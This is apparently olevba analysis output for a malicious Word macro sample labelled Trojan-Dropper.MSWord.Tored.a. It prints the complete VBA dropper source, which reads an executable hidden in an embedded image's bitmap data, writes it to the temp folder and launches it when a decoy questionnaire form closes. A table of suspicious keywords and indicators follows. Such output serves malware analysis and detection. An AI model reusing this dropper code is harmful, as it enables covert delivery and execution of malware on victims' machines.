olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Trojan-Dropper.MSWord.Tored.a
Type: Text
-------------------------------------------------------------------------------
VBA MACRO ./Trojan-Dropper.MSWord.Tored.a 
in file: ./Trojan-Dropper.MSWord.Tored.a - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit
Private Declare Function GetBitmapBits Lib "Gdi32.dll" ( _
    ByVal hBitmap As Long, _
    ByVal cbBuffer As Long, _
    lpBits As Any) As Long
    
Private Declare Function ShellExecute Lib "Shell32.dll" _
  Alias "ShellExecuteA" _
  (ByVal hWnd As Long, _
  ByVal lpOperation As Long, _
  ByVal lpFile As String, _
  ByVal lpParameters As Long, _
  ByVal lpDirectory As Long, _
  ByVal nShowCmd As Integer) As Long
   
Private Declare Function GetTempPath Lib "kernel32" _
  Alias "GetTempPathA" _
  (ByVal nBufferLength As Long, _
  ByVal lpBuffer As String) As Long
  
Private Declare Function GetTempFileName Lib "kernel32" _
  Alias "GetTempFileNameA" _
  (ByVal lpszPath As String, _
  ByVal lpPrefixString As String, _
  ByVal wUnique As Long, _
  ByVal lpTempFileName As String) As Long
  
  Private Declare Function CreateFile Lib "kernel32" _
  Alias "CreateFileA" _
  (ByVal lpFileName As String, _
  ByVal dwDesiredAccess As Long, _
  ByVal dwShareMode As Long, _
  lpSecurityAttributes As Long, _
  ByVal dwCreationDisposition As Long, _
  ByVal dwFlagsAndAttributes As Long, _
  ByVal hTemplateFile As Long) As Long
  
  Private Declare Function CloseHandle Lib "kernel32.dll" _
  (ByVal handle As Long) As Integer
  
  Private Declare Function WriteFile Lib "kernel32.dll" _
  (ByVal hFile As Long, _
  ByRef lpcVoid As Any, _
  ByVal nNumberOfBytesToWrite As Long, _
  lpNumberOfBytesWritten As Long, _
  ByVal lpOverlapped As Long) As Integer
  
Function CreateTempFileName(strPrefix As String) As String
  Const MAX_PATH = 2048
  Dim strPath As String
  Dim strBuffer As String
  Dim cntBytes As Long
  Dim err As Long
  Dim cntLen As Integer
  
  strBuffer = Space(MAX_PATH)
  cntBytes = GetTempPath(Len(strBuffer), strBuffer)
  If cntBytes > 0 Then
    strPath = Left(strBuffer, cntBytes)
    CreateTempFileName = strPath & "\" & strPrefix & ".exe"
  End If
End Function

Private Sub LoadAndRun()
  Dim DataSize As Long
 
  Dim hBitmap As Long
  ' �������� ����� ��� ����� � ����� ������ 8250
  Dim buffer(1 To 8250) As Byte
  Dim cbCopiedBits As Long
  
  Dim FileName As String
  Dim RetCode As Long
  Dim hExeFile As Long
  Dim rc As Integer
  Dim rc1 As Integer
  Dim nCntWrittenBytes As Long
  FileName = CreateTempFileName("demo2")
  'FileName = "c:\!\new2.exe"
  
  ' �������� ����� ��� ����� � ����� ������ 8250
  DataSize = 8250
  
  hBitmap = Image1.Picture.handle
  cbCopiedBits = GetBitmapBits(hBitmap, DataSize, buffer(1))
    
  hExeFile = CreateFile(FileName, 1073741824, 0, 0, 2, 128, 0)
  If hExeFile <> 0 Then
    rc = WriteFile(hExeFile, buffer(1), DataSize, nCntWrittenBytes, 0)
    rc1 = CloseHandle(hExeFile)
    If rc <> 0 And rc1 <> 0 And DataSize = nCntWrittenBytes Then
        Call ShellExecute(0, 0, FileName, 0, 0, 1)
    End If
  End If
End Sub


Private Sub UserForm_Terminate()

' MsgBox "������ ����2"

Call LoadAndRun

End Sub

Private Sub MultiPage1_Change()
    Dim RetCode As String
    If MultiPage1.Value = 3 Then
        
        ResultTextBox.Visible = False
        If OptionButton1.Value = True Then
            RetCode = "1"
        ElseIf OptionButton2.Value = True Then
            RetCode = "2"
        Else
            Result.Caption = "��� ������ �� ������ ������"
            Exit Sub
        End If
                
        If OptionButton3.Value = True Then
            RetCode = RetCode + "3"
        ElseIf OptionButton4.Value = True Then
            RetCode = RetCode + "4"
        Else
            Result.Caption = "��� ������ �� ������ ������"
            Exit Sub
        End If
       
        If CheckBox1.Value = True Then
            RetCode = RetCode + "1"
        Else
            RetCode = RetCode + "0"
        End If
   
        
        If TextBox1.TextLength = 0 And CheckBox1.Value = False Then
            Result.Caption = "��� ������ �� ������ ������"
            Exit Sub
        Else
            If IsNumeric(TextBox1.Text) = False And TextBox1.TextLength <> 0 Then
                Result.Caption = "����� �� ������ ������ ������ ���� ������"
                Exit Sub
            Else
                RetCode = RetCode + TextBox1.Text
            End If
        End If
        
        Result.Caption = "��������� �������������. ���������� � �������."
        ResultTextBox.Visible = True
        ResultTextBox.Text = RetCode
        
    End If
End Sub

Private Sub UserForm_Click()

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |UserForm_Click      |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|AutoExec  |MultiPage1_Change   |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|ShellExecute        |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|ShellExecuteA       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Shell32             |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Gdi32.dll           |Executable file name                         |
|IOC       |Shell32.dll         |Executable file name                         |
|IOC       |kernel32.dll        |Executable file name                         |
|IOC       |new2.exe            |Executable file name                         |
+----------+--------------------+---------------------------------------------+

